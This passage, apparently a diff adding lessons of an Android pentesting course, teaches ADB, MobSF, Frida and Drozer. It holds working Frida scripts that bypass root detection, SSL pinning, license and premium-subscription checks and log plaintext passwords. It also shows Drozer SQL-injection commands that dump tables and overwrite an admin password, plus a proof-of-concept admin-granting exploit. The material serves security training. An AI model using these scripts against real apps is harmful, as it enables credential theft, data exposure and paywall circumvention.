+                <h4>💡 ADB is Your Remote Control for Android</h4>
+                <p>Think of ADB like a universal remote for Android devices:<br><br>
+                • <strong>Install/uninstall apps:</strong> Like a software store manager<br>
+                • <strong>Transfer files:</strong> Like a USB cable on steroids<br>
+                • <strong>View logs:</strong> Like reading the device's diary<br>
+                • <strong>Shell access:</strong> Like having a terminal inside the phone<br>
+                • <strong>Package manager:</strong> Like Android's app inventory system<br>
+                • <strong>Activity manager:</strong> Like the phone's task manager<br><br>
+                For pentesters, ADB is ESSENTIAL for dynamic analysis. You use it to:<br>
+                1. Install modified APKs<br>
+                2. Pull app databases and config files<br>
+                3. Monitor logs for sensitive data leakage<br>
+                4. Access app's private directory (with run-as or root)<br>
+                5. Intercept network traffic<br><br>
+                Master ADB = Master mobile pentesting!</p>
+            </div>
+
+<h3>Part 4: MobSF - Mobile Security Framework</h3>
+
+<p><strong>MobSF</strong> is an automated mobile app security testing framework. It combines static analysis, dynamic analysis, and security report generation into ONE powerful tool with a web interface!</p>
+
+<div class="code"># Install MobSF (Docker method - easiest):
+docker pull opensecurity/mobile-security-framework-mobsf
+
+# Run MobSF:
+docker run -it -p 8000:8000 opensecurity/mobile-security-framework-mobsf:latest
+
+# Output:
+# [INFO] MobSF is running on http://0.0.0.0:8000
+# 
+# Open browser: http://localhost:8000
+
+# Manual install (alternative):
+git clone https://github.com/MobSF/Mobile-Security-Framework-MobSF.git
+cd Mobile-Security-Framework-MobSF
+./setup.sh
+./run.sh
+
+# Web interface opens at http://127.0.0.1:8000</div>
+
+<h4>Using MobSF for Static Analysis</h4>
+
+<div class="code"># Step 1: Open MobSF web interface (http://localhost:8000)
+
+# Step 2: Upload APK
+# - Click "Upload" button
+# - Select your APK file
+# - Wait for analysis (1-3 minutes)
+
+# Step 3: View Security Report
+# MobSF automatically analyzes:
+# ✅ AndroidManifest.xml (permissions, components, attack surface)
+# ✅ Decompiled code (hardcoded secrets, crypto issues, vulnerabilities)
+# ✅ Binary analysis (native libraries)
+# ✅ Network security (SSL pinning, cleartext traffic)
+# ✅ OWASP Mobile Top 10 compliance
+# ✅ Security score (0-100)
+
+# Report sections:
+# - File Info: App name, package, version, size, hashes
+# - App Permissions: Dangerous permissions highlighted
+# - Manifest Analysis: Exported components, debuggable flag
+# - Code Analysis: Hardcoded secrets, insecure crypto, SQL injection
+# - Binary Analysis: Native code security
+# - File Analysis: Interesting files in APK
+# - Certificate Info: Signing certificate details
+# - Network Security: SSL/TLS configuration
+
+# Step 4: Download Report
+# Click "PDF Report" to get professional security assessment document!</div>
+
+<h4>MobSF Dynamic Analysis</h4>
+
+<div class="code"># Dynamic analysis requires running the app in an emulator/device
+
+# Step 1: Set up Android emulator with MobSF support
+# (Use Genymotion or Android Studio AVD with Google APIs)
+
+# Step 2: Connect emulator to MobSF
+# In MobSF web interface:
+# - Click "Dynamic Analyzer"
+# - Select your device/emulator
+# - Click "Start Dynamic Analysis"
+
+# Step 3: MobSF automatically:
+# ✅ Installs the app
+# ✅ Sets up proxy to intercept traffic
+# ✅ Hooks into the app with Frida
+# ✅ Monitors API calls, file operations, network requests
+
+# Step 4: Use the app normally
+# - Login, browse, perform actions
+# - MobSF captures everything in background
+
+# Step 5: View Dynamic Analysis Results
+# - API Endpoints Discovered
+# - Captured Network Traffic (HTTP/HTTPS)
+# - Sensitive Data in Transit
+# - Insecure Data Storage
+# - Runtime Permissions Used
+# - Screenshots of Each Activity</div>
+
+<div class="info-box">
+<h4>MobSF Security Checks (What It Looks For)</h4>
+<p><strong>High Risk Issues:</strong><br>
+• Hardcoded API keys, tokens, passwords<br>
+• Debuggable flag enabled in AndroidManifest<br>
+• Backup flag enabled (allows adb backup)<br>
+• Weak cryptographic algorithms (DES, MD5)<br>
+• SQL injection vulnerabilities<br>
+• Command injection vulnerabilities<br>
+• Insecure random number generation<br>
+• Certificate pinning bypass methods<br><br>
+<strong>Medium Risk Issues:</strong><br>
+• Exported activities/services without permissions<br>
+• Cleartext traffic allowed<br>
+• Insufficient SSL/TLS validation<br>
+• Insecure file permissions<br>
+• Logging sensitive information<br><br>
+<strong>Low Risk Issues:</strong><br>
+• Obfuscation not enabled<br>
+• Tapjacking vulnerabilities<br>
+• Screenshot allowed on sensitive screens<br><br>
+<strong>MobSF maps findings to:</strong><br>
+• OWASP Mobile Top 10<br>
+• CWE (Common Weakness Enumeration)<br>
+• CVSS scores</p>
+</div>
+
+<h4>Interpreting MobSF Results</h4>
+
+<div class="code"># Example MobSF findings:
+
+# 🔴 HIGH: Hardcoded Secrets Found
+# File: com/example/app/api/ApiClient.java
+# Line: 15
+# Code: private static final String API_KEY = "sk_live_1234567890";
+# 
+# Severity: HIGH
+# CWE: CWE-798 (Use of Hard-coded Credentials)
+# OWASP: M9 - Reverse Engineering
+# 
+# Impact: API key exposed, attackers can access backend services
+# Recommendation: Store keys in secure keystore, never in code
+
+# 🔴 HIGH: App is Debuggable
+# File: AndroidManifest.xml
+# Line: 8
+# Code: android:debuggable="true"
+# 
+# Severity: HIGH
+# CWE: CWE-215 (Information Exposure Through Debug Information)
+# OWASP: M7 - Client Code Quality
+# 
+# Impact: App can be debugged with tools like Android Studio, allowing real-time code inspection
+# Recommendation: Set android:debuggable="false" for production builds
+
+# 🟡 MEDIUM: Exported Activity without Permission
+# File: AndroidManifest.xml
+# Component: com.example.app.SecretActivity
+# Code: android:exported="true"
+# 
+# Severity: MEDIUM
+# CWE: CWE-927 (Use of Implicit Intent for Sensitive Communication)
+# OWASP: M1 - Improper Platform Usage
+# 
+# Impact: Other apps can launch this activity, potentially accessing sensitive functions
+# Recommendation: Add permission check or set exported="false"
+
+# 🟡 MEDIUM: Weak Cryptography - DES
+# File: com/example/app/crypto/Encryption.java
+# Line: 42
+# Code: Cipher cipher = Cipher.getInstance("DES/CBC/PKCS5Padding");
+# 
+# Severity: MEDIUM
+# CWE: CWE-327 (Use of a Broken or Risky Cryptographic Algorithm)
+# OWASP: M5 - Insufficient Cryptography
+# 
+# Impact: DES is easily brute-forced (56-bit key)
+# Recommendation: Use AES-256 instead
+
+# Overall Security Score: 45/100 (HIGH RISK)</div>
+
+<div class="warning-box">
+<h4>⚠️ MobSF Limitations</h4>
+<p>MobSF is AMAZING but not perfect:<br><br>
+<strong>False Positives:</strong> Some flagged issues may be intentional or not exploitable in context<br>
+<strong>Obfuscation Blind Spots:</strong> Heavily obfuscated code may hide vulnerabilities<br>
+<strong>Logic Flaws:</strong> Can't detect business logic issues (like "forgot password" bypass)<br>
+<strong>Dynamic Analysis Requires Manual Testing:</strong> You still need to test all app features manually<br><br>
+<strong>Best practice:</strong> Use MobSF as a starting point, then manually verify findings and test edge cases!</p>
+</div>
+
+            <h3>Part 5: Frida - Dynamic Instrumentation Framework</h3>
+
+            <p><strong>Frida</strong> is a powerful dynamic instrumentation toolkit that lets you inject JavaScript into running processes on Android, iOS, Windows, Mac, and Linux. For mobile pentesting, it's your magic wand for bypassing security checks, hooking functions, and manipulating app behavior in real-time!</p>
+
+            <div class="metaphor-box">
+                <h4>💡 Frida = X-Ray Vision + Time Control for Apps</h4>
+                <p>Imagine an app is a locked mansion with guards and security systems. Traditional static analysis (APKTool, Jadx) lets you study the blueprints after the fact. But Frida lets you:<br><br>
+                • <strong>See through walls:</strong> Monitor what's happening inside while the app runs<br>
+                • <strong>Freeze time:</strong> Intercept function calls before they execute<br>
+                • <strong>Rewrite reality:</strong> Change function parameters, return values, even entire behaviors<br>
+                • <strong>Read minds:</strong> Log private data being processed in memory<br><br>
+                With Frida, you can bypass root detection, SSL pinning, jailbreak checks, license validation—all without modifying the APK!</p>
+            </div>
+
+            <h4>Installing Frida</h4>
+
+            <div class="code"># Install Frida on your Kali machine:
+pip3 install frida-tools
+
+# Verify installation:
+frida --version
+
+# Output:
+# 16.2.1
+
+# Download frida-server for your Android device
+# Check your device architecture first:
+adb shell getprop ro.product.cpu.abi
+
+# Output examples:
+# arm64-v8a    ← 64-bit ARM (most modern phones)
+# armeabi-v7a  ← 32-bit ARM (older phones)
+# x86_64       ← 64-bit Intel (emulators)
+
+# Download matching frida-server from:
+# https://github.com/frida/frida/releases
+
+# Example for arm64-v8a:
+wget https://github.com/frida/frida/releases/download/16.2.1/frida-server-16.2.1-android-arm64.xz
+unxz frida-server-16.2.1-android-arm64.xz
+mv frida-server-16.2.1-android-arm64 frida-server
+
+# Push to device:
+adb push frida-server /data/local/tmp/
+
+# Make executable:
+adb shell "chmod 755 /data/local/tmp/frida-server"
+
+# Run frida-server on device (requires root!):
+adb shell "su -c /data/local/tmp/frida-server &"
+
+# Or for non-root testing with specific apps:
+adb shell "/data/local/tmp/frida-server"</div>
+
+            <div class="warning-box">
+                <h4>⚠️ Frida Requires Root for Most Features</h4>
+                <p>To hook into arbitrary apps, your device needs root access. Alternatives:<br><br>
+                <strong>Option 1: Rooted physical device</strong> (Magisk, SuperSU)<br>
+                <strong>Option 2: Rooted emulator</strong> (Genymotion, Android Studio AVD with Google APIs)<br>
+                <strong>Option 3: Frida Gadget</strong> (inject Frida into the APK itself - no root needed but requires repackaging)<br><br>
+                For learning, use a rooted emulator like Genymotion!</p>
+            </div>
+
+            <h4>Frida Basics - Your First Hook</h4>
+
+            <div class="code"># List all running processes:
+frida-ps -U
+
+# -U = USB device (or emulator)
+# Output:
+#  PID  Name
+# ----  ------------------------------
+# 1234  com.android.systemui
+# 5678  com.example.targetapp
+# 9012  com.google.android.gms
+# [... more processes ...]
+
+# List only apps (not system processes):
+frida-ps -Ua
+
+# Output:
+#  PID  Name                         Identifier
+# ----  ---------------------------  --------------------------
+# 5678  Target App                   com.example.targetapp
+# 9876  Banking App                  com.bankingapp.mobile
+
+# Attach to a running app:
+frida -U -n "Target App"
+
+# -U = USB device
+# -n = process name
+# 
+# Opens interactive Frida REPL (Read-Eval-Print Loop)
+
+# Or attach by package name:
+frida -U -f com.example.targetapp
+
+# -f = spawn (launch the app with Frida attached from start)
+
+# Or attach by PID:
+frida -U 5678</div>
+
+            <h4>Writing Frida Scripts - JavaScript Hooking</h4>
+
+            <p>Frida uses JavaScript to interact with the target app. Here's the anatomy of a Frida script:</p>
+
+            <div class="code"># Create a simple hook script: hook_example.js
+
+Java.perform(function() {
+    // Java.perform() ensures we're inside the Java runtime
+
+    // 1. Get reference to the class you want to hook
+    var MainActivity = Java.use('com.example.app.MainActivity');
+    
+    // 2. Hook a method
+    MainActivity.checkLicense.implementation = function() {
+        // This replaces the original checkLicense() method
+        
+        console.log('[*] checkLicense() called!');
+        console.log('[*] Original would check license, but we\'re bypassing...');
+        
+        // Return true (license valid) regardless of actual check
+        return true;
+    };
+    
+    console.log('[+] License check bypassed!');
+});
+
+# Run the script:
+frida -U -f com.example.app -l hook_example.js --no-pause
+
+# Output:
+# [+] License check bypassed!
+# [*] checkLicense() called!
+# [*] Original would check license, but we're bypassing...
+# 
+# The app now thinks it has a valid license!</div>
+
+            <h4>Bypassing Root Detection with Frida</h4>
+
+            <div class="code"># Many apps detect root and refuse to run
+# Common checks: su binary exists, Magisk/SuperSU installed, test-keys build
+
+# Create bypass_root_detection.js:
+
+Java.perform(function() {
+    console.log('[*] Root detection bypass started');
+
+    // Method 1: Hook common root detection method
+    var RootCheck = Java.use('com.example.app.security.RootDetector');
+    
+    RootCheck.isDeviceRooted.implementation = function() {
+        console.log('[*] isDeviceRooted() called - returning false');
+        return false;  // Always return false (not rooted)
+    };
+    
+    // Method 2: Hook File.exists() to hide su binary
+    var File = Java.use('java.io.File');
+    
+    File.exists.implementation = function() {
+        var path = this.getAbsolutePath();
+        
+        // List of paths that indicate root
+        var rootPaths = [
+            '/system/app/Superuser.apk',
+            '/system/bin/su',
+            '/system/xbin/su',
+            '/data/local/xbin/su',
+            '/sbin/su',
+            '/system/sd/xbin/su',
+            '/system/bin/failsafe/su',
+            '/data/local/su'
+        ];
+        
+        // If checking for root files, return false
+        if (rootPaths.indexOf(path) !== -1) {
+            console.log('[*] File.exists("' + path + '") intercepted - returning false');
+            return false;
+        }
+        
+        // Otherwise, call original method
+        return this.exists.call(this);
+    };
+    
+    // Method 3: Hook Runtime.exec() to prevent 'su' command execution
+    var Runtime = Java.use('java.lang.Runtime');
+    
+    Runtime.exec.overload('java.lang.String').implementation = function(cmd) {
+        if (cmd.indexOf('su') !== -1) {
+            console.log('[*] Runtime.exec("' + cmd + '") intercepted - preventing execution');
+            throw new Error('Command not found');
+        }
+        return this.exec.call(this, cmd);
+    };
+    
+    // Method 4: Hook Build.TAGS to hide test-keys
+    var Build = Java.use('android.os.Build');
+    
+    Build.TAGS.value = 'release-keys';  // Change from 'test-keys' to 'release-keys'
+    console.log('[*] Build.TAGS changed to: ' + Build.TAGS.value);
+    
+    console.log('[+] Root detection fully bypassed!');
+});
+
+# Run it:
+frida -U -f com.example.app -l bypass_root_detection.js --no-pause
+
+# The app now runs on rooted device without detecting root!</div>
+
+            <h4>Bypassing SSL Pinning with Frida</h4>
+
+            <p>SSL pinning prevents Man-in-the-Middle attacks by only trusting specific certificates. But for pentesting, we WANT to intercept traffic with Burp Suite! Here's how to bypass it:</p>
+
+            <div class="code"># Create bypass_ssl_pinning.js:
+
+Java.perform(function() {
+    console.log('[*] SSL Pinning bypass started');
+
+    // Method 1: Hook TrustManager (most common SSL implementation)
+    var X509TrustManager = Java.use('javax.net.ssl.X509TrustManager');
+    var SSLContext = Java.use('javax.net.ssl.SSLContext');
+    
+    // Create a custom TrustManager that trusts all certificates
+    var TrustManager = Java.registerClass({
+        name: 'com.frida.TrustManager',
+        implements: [X509TrustManager],
+        methods: {
+            checkClientTrusted: function(chain, authType) {
+                console.log('[*] checkClientTrusted called - trusting all');
+            },
+            checkServerTrusted: function(chain, authType) {
+                console.log('[*] checkServerTrusted called - trusting all');
+            },
+            getAcceptedIssuers: function() {
+                console.log('[*] getAcceptedIssuers called - returning empty');
+                return [];
+            }
+        }
+    });
+    
+    // Replace SSLContext's TrustManager with our custom one
+    var TrustManagers = [TrustManager.$new()];
+    
+    SSLContext.init.overload('[Ljavax.net.ssl.KeyManager;', '[Ljavax.net.ssl.TrustManager;', 'java.security.SecureRandom').implementation = function(keyManager, trustManager, secureRandom) {
+        console.log('[*] SSLContext.init() called - replacing TrustManager');
+        this.init.call(this, keyManager, TrustManagers, secureRandom);
+    };
+    
+    // Method 2: Hook OkHttp (popular HTTP library)
+    try {
+        var OkHttpClient = Java.use('okhttp3.OkHttpClient');
+        var Builder = Java.use('okhttp3.OkHttpClient$Builder');
+        
+        Builder.certificatePinner.implementation = function(certificatePinner) {
+            console.log('[*] OkHttp certificatePinner() called - disabling pinning');
+            return this;  // Return builder without pinning
+        };
+        
+        console.log('[+] OkHttp SSL pinning bypassed');
+    } catch(err) {
+        console.log('[-] OkHttp not found (app might not use it)');
+    }
+    
+    // Method 3: Hook specific app's SSL verification
+    // (You need to find the exact class/method via Jadx)
+    try {
+        var CustomPinning = Java.use('com.example.app.network.CertificatePinner');
+        
+        CustomPinning.check.implementation = function() {
+            console.log('[*] Custom certificate check bypassed');
+            return true;  // Always pass verification
+        };
+    } catch(err) {
+        // App doesn't have custom pinning class
+    }
+    
+    console.log('[+] SSL Pinning fully bypassed - use Burp Suite!');
+});
+
+# Run with the app:
+frida -U -f com.example.app -l bypass_ssl_pinning.js --no-pause
+
+# Configure Burp Suite proxy on your device:
+# Settings → WiFi → Long-press network → Modify → Proxy: Manual
+# Proxy hostname: 192.168.1.100 (your Kali IP)
+# Proxy port: 8080
+
+# Now all HTTPS traffic flows through Burp Suite with no certificate errors!</div>
+
+            <h4>Logging Function Arguments and Return Values</h4>
+
+            <div class="code"># Create log_function.js to spy on any function:
+
+Java.perform(function() {
+    var TargetClass = Java.use('com.example.app.auth.LoginManager');
+    
+    // Hook the login method
+    TargetClass.doLogin.overload('java.lang.String', 'java.lang.String').implementation = function(username, password) {
+        console.log('[*] ===== doLogin() called =====');
+        console.log('[*] Username: ' + username);
+        console.log('[*] Password: ' + password);  // DANGER: This logs plaintext passwords!
+        
+        // Call the original method and capture return value
+        var result = this.doLogin(username, password);
+        
+        console.log('[*] Return value: ' + result);
+        console.log('[*] ===========================');
+        
+        return result;  // Pass through the original return value
+    };
+});
+
+# Run it:
+frida -U -f com.example.app -l log_function.js --no-pause
+
+# When user logs in:
+# [*] ===== doLogin() called =====
+# [*] Username: testuser@example.com
+# [*] Password: MySecretPass123
+# [*] Return value: true
+# [*] ===========================
+
+# You just intercepted the login credentials!</div>
+
+            <h4>Modifying Function Return Values</h4>
+
+            <div class="code"># Create bypass_premium_check.js:
+
+Java.perform(function() {
+    var UserAccount = Java.use('com.example.app.model.UserAccount');
+    
+    // Hook isPremiumUser method
+    UserAccount.isPremiumUser.implementation = function() {
+        console.log('[*] isPremiumUser() called');
+        
+        // Original method would check subscription status
+        // But we'll just return true!
+        console.log('[*] Returning true (premium access granted)');
+        return true;
+    };
+    
+    // Hook getSubscriptionExpiry method
+    UserAccount.getSubscriptionExpiry.implementation = function() {
+        console.log('[*] getSubscriptionExpiry() called');
+        
+        // Return a date far in the future
+        var futureDate = Java.use('java.util.Date').$new();
+        futureDate.setYear(2099);  // Subscription expires in 2099!
+        
+        console.log('[*] Returning subscription expiry: 2099');
+        return futureDate;
+    };
+    
+    console.log('[+] Premium bypass active - enjoy all features for free!');
+});
+
+# Now the app thinks you have a premium subscription!</div>
+
+            <h4>Frida CLI Tools Reference</h4>
+
+            <div class="code"># frida-ps: List processes
+frida-ps -U          # List all processes on USB device
+frida-ps -Ua         # List only applications
+frida-ps -Uai        # List installed applications (not just running)
+
+# frida: Attach and run scripts
+frida -U -n "App Name"                    # Attach to running app by name
+frida -U -f com.example.app               # Spawn app with Frida attached
+frida -U -f com.example.app --no-pause   # Spawn and don't pause at startup
+frida -U -p 1234                          # Attach to process ID 1234
+frida -U -f com.example.app -l script.js  # Run script on spawn
+
+# frida-trace: Auto-generate hooks
+frida-trace -U -f com.example.app -j '*!*Login*'
+
+# -j = Java method pattern
+# '*!*Login*' = All classes, methods containing "Login"
+# Auto-generates hook scripts for each method!
+
+# Example: Trace all SSL-related methods:
+frida-trace -U -f com.example.app -j '*!*SSL*'
+
+# Trace specific class:
+frida-trace -U -f com.example.app -j 'com.example.app.MainActivity!*'
+
+# frida-discover: Discover app's classes and methods
+frida-discover -U com.example.app
+
+# frida-ls: List files accessible to app
+frida-ls -U com.example.app /data/data/com.example.app/
+
+# frida-kill: Kill a process
+frida-kill -U com.example.app</div>
+
+            <div class="metaphor-box">
+                <h4>🎉 Frida = Your Mobile App Superpowers!</h4>
+                <p>You've learned how to:<br><br>
+                ✅ <strong>Bypass root detection</strong> → Run pentesting tools on production apps<br>
+                ✅ <strong>Bypass SSL pinning</strong> → Intercept HTTPS traffic with Burp Suite<br>
+                ✅ <strong>Hook any function</strong> → Log arguments, modify returns, change behavior<br>
+                ✅ <strong>Bypass premium checks</strong> → Test app features without paying<br>
+                ✅ <strong>Extract sensitive data</strong> → Capture passwords, tokens, API keys in memory<br><br>
+                Frida is the most powerful tool for mobile dynamic analysis. Combine it with static analysis (APKTool, Jadx) and you can break almost any mobile app!<br><br>
+                <strong>Practice challenges:</strong><br>
+                • Download InsecureBankv2 (intentionally vulnerable app)<br>
+                • Try bypassing its root detection<br>
+                • Hook the login function to log credentials<br>
+                • Bypass premium features<br><br>
+                Remember: Only test apps you have permission to test! 🚀</p>
+            </div>
+
+            <h3>Part 6: Drozer - Android Security Assessment Framework</h3>
+
+            <p><strong>Drozer</strong> (formerly Mercury) is a comprehensive security audit and attack framework for Android. It finds and exploits vulnerabilities in Android apps and devices by simulating a malicious app trying to interact with target components.</p>
+
+            <div class="metaphor-box">
+                <h4>💡 Drozer = Social Engineering for Android Apps</h4>
+                <p>Think of Android apps as houses in a neighborhood. Some houses have unlocked windows (exported components), some leave their WiFi passwords written on the door (insecure data storage), some trust any visitor claiming to be the mailman (intent vulnerabilities).<br><br>
+                Drozer is like a burglar doing reconnaissance:<br>
+                • <strong>Finding entry points:</strong> Exported activities, services, broadcast receivers, content providers<br>
+                • <strong>Testing locks:</strong> Checking if components require permissions<br>
+                • <strong>Exploiting trust:</strong> Sending malicious intents to trigger unexpected behavior<br>
+                • <strong>Stealing data:</strong> Querying content providers without authorization<br><br>
+                Drozer automates the discovery and exploitation of these Android-specific vulnerabilities!</p>
+            </div>
+
+            <h4>Installing Drozer</h4>
+
+            <div class="code"># Install Drozer on Kali:
+# (Drozer Python 3 fork)
+git clone https://github.com/WithSecureLabs/drozer.git
+cd drozer
+pip3 install .
+
+# Verify installation:
+drozer --version
+
+# Output:
+# drozer 3.0.0
+
+# Download and install Drozer Agent APK on Android device:
+wget https://github.com/WithSecureLabs/drozer-agent/releases/download/3.0.0/drozer-agent.apk
+adb install drozer-agent.apk
+
+# Launch Drozer Agent app on your device
+# Tap "Embedded Server" toggle to start server
+# Default port: 31415</div>
+
+            <h4>Connecting Drozer to Your Device</h4>
+
+            <div class="code"># Forward the Drozer port from device to your Kali machine:
+adb forward tcp:31415 tcp:31415
+
+# Connect to the Drozer agent:
+drozer console connect
+
+# Output:
+#             ..                    ..:.
+#            ..o..                  .r..
+#             ..a..  . ....... .  ..nd
+#               ro..idsnemesisand..pr
+#               .otectorandroidsneme.
+#            .,sisandprotectorandroids+.
+#          ..nemesisandprotectorandroidsn:.
+#        .emesisandprotectorandroidsnemes..
+#      ..isandp,..,rotectorandro,..,idsnem.
+#      .isisandp..rotectorandroid..snemisis.
+#      ,andprotectorandroidsnemisisandprotec.
+#     .torandroidsnemesisandprotectorandroid.
+#     .snemisisandprotectorandroidsnemesisan:
+#     .dprotectorandroidsnemesisandprotector.
+#
+# drozer Console (v3.0.0)
+# dz>
+
+# You're now connected to the device!</div>
+
+            <h4>Drozer Basic Commands - Information Gathering</h4>
+
+            <div class="code"># Inside Drozer console (dz>):
+
+# List all installed packages:
+dz> run app.package.list
+
+# Output:
+# com.android.browser
+# com.android.calendar
+# com.example.vulnerableapp
+# [hundreds more...]
+
+# Search for a specific app:
+dz> run app.package.list -f bank
+
+# Output:
+# com.bankofamerica.mobile
+# com.chase.banking
+# com.example.bankingapp
+
+# Get detailed info about a package:
+dz> run app.package.info -a com.example.vulnerableapp
+
+# Output:
+# Package: com.example.vulnerableapp
+#   Process Name: com.example.vulnerableapp
+#   Version: 1.0.0
+#   Data Directory: /data/user/0/com.example.vulnerableapp
+#   APK Path: /data/app/com.example.vulnerableapp-xyz=/base.apk
+#   UID: 10123
+#   GID: [3003, 1015, 1028]
+#   Shared Libraries: null
+#   Shared User ID: null
+#   Permissions:
+#     - android.permission.INTERNET
+#     - android.permission.WRITE_EXTERNAL_STORAGE
+#     - android.permission.READ_EXTERNAL_STORAGE</div>
+
+            <h4>Identifying Attack Surface</h4>
+
+            <div class="code"># Find exported activities (can be launched by other apps):
+dz> run app.activity.info -a com.example.vulnerableapp
+
+# Output:
+# Package: com.example.vulnerableapp
+#   com.example.vulnerableapp.MainActivity
+#     Permission: null                    ← NO PERMISSION REQUIRED!
+#     Exported: True                      ← ACCESSIBLE BY ANY APP!
+#   com.example.vulnerableapp.SecretActivity
+#     Permission: null
+#     Exported: True                      ← VULNERABILITY!
+
+# Launch the secret activity:
+dz> run app.activity.start --component com.example.vulnerableapp com.example.vulnerableapp.SecretActivity
+
+# The secret activity opens! (Should have been protected)
+
+# Find exported services:
+dz> run app.service.info -a com.example.vulnerableapp
+
+# Output:
+# Package: com.example.vulnerableapp
+#   com.example.vulnerableapp.AdminService
+#     Permission: null
+#     Exported: True                      ← ANY APP CAN START THIS!
+
+# Find broadcast receivers:
+dz> run app.broadcast.info -a com.example.vulnerableapp
+
+# Output:
+# Package: com.example.vulnerableapp
+#   com.example.vulnerableapp.SMSReceiver
+#     Permission: null
+#     Exported: True
+
+# Send a broadcast to trigger it:
+dz> run app.broadcast.send --action android.provider.Telephony.SMS_RECEIVED
+
+# Find content providers (database interfaces):
+dz> run app.provider.info -a com.example.vulnerableapp
+
+# Output:
+# Package: com.example.vulnerableapp
+#   com.example.vulnerableapp.UserProvider
+#     Authority: com.example.vulnerableapp.users
+#     Read Permission: null               ← NO READ PERMISSION!
+#     Write Permission: null              ← NO WRITE PERMISSION!
+#     Exported: True                      ← ANYONE CAN ACCESS DATABASE!
+#     Grant URI Permissions: False</div>
+
+            <h4>Exploiting Content Providers (SQL Injection)</h4>
+
+            <div class="code"># Content providers expose database queries to other apps
+# If not properly secured, they're vulnerable to SQL injection!
+
+# List accessible content URIs:
+dz> run scanner.provider.finduris -a com.example.vulnerableapp
+
+# Output:
+# Scanning com.example.vulnerableapp...
+# content://com.example.vulnerableapp.users/
+# content://com.example.vulnerableapp.users/user
+# content://com.example.vulnerableapp.users/admin
+
+# Query the content provider:
+dz> run app.provider.query content://com.example.vulnerableapp.users/user
+
+# Output:
+# | _id | username      | password       | email                |
+# |-----|---------------|----------------|----------------------|
+# | 1   | john_doe      | password123    | john@example.com     |
+# | 2   | admin         | admin123       | admin@example.com    |
+# | 3   | alice         | mypassword     | alice@example.com    |
+
+# SQL Injection test - try to dump all data:
+dz> run app.provider.query content://com.example.vulnerableapp.users/user --selection "1=1"
+
+# If vulnerable, returns all records regardless of intended filter
+
+# Advanced SQL injection - extract database schema:
+dz> run app.provider.query content://com.example.vulnerableapp.users/user --projection "* FROM sqlite_master WHERE type='table'--"
+
+# Try to read other tables:
+dz> run app.provider.query content://com.example.vulnerableapp.users/user --projection "* FROM credit_cards--"
+
+# Output:
+# | _id | card_number       | cvv  | expiry   |
+# |-----|-------------------|------|----------|
+# | 1   | 4532123456789012  | 123  | 12/25    |
+# | 2   | 5425233412341234  | 456  | 06/26    |
+
+# DATA BREACH! Credit cards exposed via SQL injection!
+
+# Try to modify data (if provider allows write):
+dz> run app.provider.update content://com.example.vulnerableapp.users/user --selection "_id=2" --string username admin --string password hacked123
+
+# Changed admin password!</div>
+
+            <h4>Automated Vulnerability Scanning</h4>
+
+            <div class="code"># Drozer has built-in scanners for common vulnerabilities:
+
+# Scan for all vulnerabilities in a package:
+dz> run scanner.misc.traverse -a com.example.vulnerableapp
+
+# Scans for path traversal vulnerabilities
+
+# Scan for native code issues:
+dz> run scanner.misc.native -a com.example.vulnerableapp
+
+# Scan for debug flags:
+dz> run app.package.debuggable
+
+# Output:
+# Package: com.example.vulnerableapp
+#   Debuggable: True                      ← SECURITY ISSUE!
+
+# Scan for backup flags:
+dz> run app.package.backup
+
+# Output:
+# Package: com.example.vulnerableapp
+#   Allows Backup: True                   ← Data can be extracted via adb backup!
+
+# Scan for shared UID:
+dz> run app.package.shareduid
+
+# Scan for SQL injection in all providers:
+dz> run scanner.provider.injection -a com.example.vulnerableapp
+
+# Output:
+# Scanning com.example.vulnerableapp...
+# Injection in Projection:
+#   content://com.example.vulnerableapp.users/user
+#     Vulnerable to projection-based SQL injection
+# 
+# Injection in Selection:
+#   content://com.example.vulnerableapp.users/user
+#     Vulnerable to selection-based SQL injection
+
+# Scan for path traversal in providers:
+dz> run scanner.provider.traversal -a com.example.vulnerableapp
+
+# Scan for all exported components:
+dz> run scanner.activity.browsable -a com.example.vulnerableapp
+dz> run scanner.provider.finduris -a com.example.vulnerableapp</div>
+
+            <h4>Creating a Proof-of-Concept Exploit</h4>
+
+            <div class="code"># Scenario: We found that com.example.vulnerableapp has:
+# 1. Exported activity that grants admin privileges
+# 2. No permission required
+# 
+# Let's write a malicious APK to exploit it!
+
+# Create exploit.py (Drozer module):
+
+class Exploit(Module):
+    name = "Exploit Vulnerable App"
+    description = "Grant admin privileges via exported activity"
+    
+    def execute(self, arguments):
+        # Launch the privileged activity
+        intent = android.Intent()
+        intent.setComponent(
+            "com.example.vulnerableapp",
+            "com.example.vulnerableapp.GrantAdminActivity"
+        )
+        intent.putExtra("username", "attacker")
+        intent.putExtra("grant_admin", True)
+        
+        self.getContext().startActivity(intent)
+        self.stdout.write("[+] Admin privileges granted to 'attacker'!\n")
+
+# Save as ~/.drozer/modules/exploit.py
+
+# Run the exploit:
+dz> run exploit
+
+# Output:
+# [+] Admin privileges granted to 'attacker'!
+# 
+# Exploitation successful! The attacker now has admin access.</div>
+
+            <div class="info-box">
+                <h4>Common Drozer Findings</h4>
+                <p><strong>Exported Components Without Permissions:</strong><br>
+                • Activities that can be launched by malicious apps<br>
+                • Services that can be started/bound without authorization<br>
+                • Broadcast receivers that process untrusted intents<br>
+                • Content providers that expose sensitive data<br><br>
+                <strong>SQL Injection in Content Providers:</strong><br>
+                • Projection-based injection (manipulate SELECT columns)<br>
+                • Selection-based injection (manipulate WHERE clause)<br>
+                • Allows reading arbitrary tables, modifying data<br><br>
+                <strong>Path Traversal:</strong><br>
+                • Content providers that accept file paths as input<br>
+                • Can read files outside app's directory (../../../etc/passwd)<br><br>
+                <strong>Debug/Backup Flags:</strong><br>
+                • android:debuggable="true" in production<br>
+                • android:allowBackup="true" (data can be extracted)<br><br>
+                <strong>Remediation:</strong><br>
+                • Set android:exported="false" unless component MUST be accessible<br>
+                • Require custom permissions for sensitive components<br>
+                • Use parameterized queries (never string concatenation)<br>
+                • Validate all input (paths, intents, query parameters)<br>
+                • Disable debugging and backups in production builds</p>
+            </div>
+
+            <div class="warning-box">
+                <h4>⚠️ iOS Pentesting: A Quick Overview</h4>
+                <p>While this chapter focuses on Android, iOS pentesting has similar concepts but different tools:<br><br>
+                <strong>iOS App Structure:</strong><br>
+                • <strong>IPA:</strong> iOS App Store Package (like APK for Android)<br>
+                • <strong>Mach-O:</strong> iOS executable format (like DEX for Android)<br>
+                • <strong>Plist:</strong> Property list files (like AndroidManifest.xml)<br><br>
+                <strong>Key Tools:</strong><br>
+                • <strong>class-dump:</strong> Extract Objective-C headers from apps<br>
